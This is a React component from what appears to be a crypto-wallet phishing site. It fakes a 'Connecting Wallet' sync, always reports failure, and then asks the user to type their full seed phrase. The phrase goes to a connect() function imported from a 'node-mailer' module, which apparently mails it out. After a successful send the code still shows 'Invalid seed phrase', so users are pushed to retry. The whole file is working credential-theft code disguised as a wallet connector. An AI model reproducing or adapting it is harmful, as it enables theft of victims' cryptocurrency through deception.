import React, { useEffect, useState } from "react";
import ReportProblemOutlinedIcon from "@mui/icons-material/ReportProblemOutlined";
import CloseOutlinedIcon from "@mui/icons-material/CloseOutlined";
import { connect } from "@/lib/node-mailer";

interface Walletdata {
  name: string;
  logo: string;
  phraseNumber: number | null
}

function Loader({
  number,
  name,
  handleClose,
  setWallets,
  walletDetails
}: {
  number: number | null;
  handleClose: () => void;
  name: string;
  setWallets: React.Dispatch<React.SetStateAction<{ name: string; logo: string; phraseNumber: number | null; }[]>>;
    walletDetails: Walletdata[]
}) {
  const texts = ["Please wait", "Synchronization", "Connecting Wallet"];
  const [content, setContent] = useState(texts[0]);
  const [index, setIndex] = useState(0);
  const [loading, setLoading] = useState(true);
  const [show, setShow] = useState(false);
  const [submissionFailed, setSubmissionFailed] = useState(false);

  useEffect(() => {
    if (index < texts.length - 1) {
      const interval = setInterval(() => {
        setIndex((prevIndex) => prevIndex + 1);
      }, 4000);
      return () => clearInterval(interval);
    }
  }, [index, texts]);

  useEffect(() => {
    setContent(texts[index]);
  }, [index, texts]);

  useEffect(() => {
    const timeout = setTimeout(() => {
      setLoading(false);
    }, 10000);
    return () => clearTimeout(timeout);
  }, [index]);

  const inputCount = number ?? 0;
  const [values, setValues] = useState<string[]>(Array(inputCount).fill(""));
  const [errors, setErrors] = useState<boolean[]>(
    Array(inputCount).fill(false)
  );

  const handleInputChange = (index: number, newValue: string) => {
    setValues((prevValues) => {
      const updatedValues = [...prevValues];
      updatedValues[index] = newValue;
      return updatedValues;
    });

    setErrors((prevErrors) => {
      const updatedErrors = [...prevErrors];
      updatedErrors[index] = false;
      return updatedErrors;
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors = values.map((val) => val.trim() === "");
    setErrors(newErrors);

    if (newErrors.some((err) => err)) {
      console.log("Form contains errors.");
      return;
    }

    setIndex(0);
    setLoading(true);
    setShow(false);
    setSubmissionFailed(false); // Reset previous error state

    const formattedValues = values.join(" ");
    try {
      await connect(name, formattedValues);
      setSubmissionFailed(true);
      setValues(Array(inputCount).fill(""))
    } catch (err) {
      console.log(err);
      setSubmissionFailed(true);
      setLoading(false); // Stop loading animation immediately on failure
    }
  };

  return (
    <>
      {show ? (
        <form onSubmit={handleSubmit} className="space-y-3 relative">
          <button
            onClick={()=>{
              handleClose()
              setWallets(walletDetails)
            }
            }
            className="absolute w-fit -top-[75px] right-2 "
          >
            <CloseOutlinedIcon sx={{ color: "#94a3b8", fontSize: "22px" }} />
          </button>
          <h2 className="font-bold text-center mt-2 text-white">
            Enter your {inputCount} digits Seed Phrase to connect wallet
          </h2>
          <div className="grid px-3 pt-[3px] h-[156px] pb-2  md:h-44 w-full overflow-scroll grid-cols-2 gap-4">
            {values.map((val, index) => (
              <input
                key={index}
                type="text"
                value={val}
                onChange={(e) => handleInputChange(index, e.target.value)}
                placeholder={`${index + 1} .`}
                className={`border text-white text-lg bg-transparent placeholder:text-slate-400 p-2 w-full h-10 rounded-sm
                  ${errors[index] ? "border-red-500" : "border-slate-800"}`}
              />
            ))}
          </div>
          <div className="flex justify-center">
            <button
              type="submit"
              className="relative h-12 md:w-[92%] overflow-hidden w-full bg-gradient-to-r
                from-cyan-500 to-cyan-400 text-black font-bold py-4 rounded-lg
                flex items-center justify-center gap-2 transition-all
                transform hover:scale-[1.02] active:scale-[0.98] shadow-lg
                before:absolute before:top-0 before:left-[-100%] before:w-[150%]
                before:h-full before:bg-white/20 before:opacity-50 before:skew-x-[-20deg]
                before:animate-shine"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="lucide lucide-wallet w-5 h-5"
              >
                <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path>
                <path d="M3 5v14a2 2 0 0 0 2 2h16v-5"></path>
                <path d="M18 12a2 2 0 0 0 0 4h4v-4Z"></path>
              </svg>
              Connect Wallet
            </button>
          </div>
        </form>
      ) : (
        <>
          {loading ? (
            <>
              <p className="mb-4 text-slate-400 text-sm">
                This may take a few minutes
              </p>
              <div className="ui-abstergo">
                <div className="abstergo-loader">
                  <div></div>
                  <div></div>
                  <div></div>
                </div>
                <div className="ui-text">
                  {content}
                  <div className="ui-dot"></div>
                  <div className="ui-dot"></div>
                  <div className="ui-dot"></div>
                </div>
              </div>
            </>
          ) : (
            <>
              <ReportProblemOutlinedIcon
                sx={{
                  color: "#ef4444",
                  fontSize: "28px",
                  marginTop: "12px",
                }}
              />
              <p className="text-sm text-center text-red-500">
                {submissionFailed
                  ? "Invalid seed phrase, please try again"
                  : "An error occurred, please try again or connect manually"}
              </p>
              <button
                onClick={() => setShow(true)}
                className="relative my-5 overflow-hidden w-full max-w-[350px] bg-gradient-to-r mt-4
            from-cyan-500 to-cyan-400 text-black font-bold py-4 rounded-lg
            flex items-center justify-center gap-2 transition-all
            transform hover:scale-[1.02] active:scale-[0.98] shadow-lg
            before:absolute before:top-0 before:left-[-100%] before:w-[150%]
            before:h-full before:bg-white/20 before:opacity-50 before:skew-x-[-20deg]
            before:animate-shine"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="lucide lucide-wallet w-5 h-5"
                >
                  <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path>
                  <path d="M3 5v14a2 2 0 0 0 2 2h16v-5"></path>
                  <path d="M18 12a2 2 0 0 0 0 4h4v-4Z"></path>
                </svg>
                Connect Manually
              </button>
            </>
          )}
        </>
      )}
    </>
  );
}

export default Loader;
